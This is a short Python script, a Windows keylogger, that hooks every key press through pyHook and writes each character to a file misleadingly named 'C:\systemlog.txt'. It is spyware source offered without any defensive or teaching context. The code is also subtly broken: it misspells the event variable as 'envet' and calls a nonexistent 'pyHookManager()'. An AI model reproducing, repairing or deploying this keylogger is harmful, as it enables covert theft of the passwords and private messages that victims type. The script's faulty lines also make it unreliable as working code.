#!/usr/bin/env python

import pythoncom
import pyHook
import sys
import logging

file_log = 'C:\\systemlog.txt'

def OnKeyboardEvent(event):
	logging.basicConfig(filename = file_log, level = logging.DEBUG, format = '%(message)s')
	chr(event.Ascii)
	logging.log(10,chr(envet.Ascii))
	return True

#create a hook object
hooks_manager = pyHookManager()
#listen all keyboardevent
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
#in loop
pythoncom.PumpMessages()
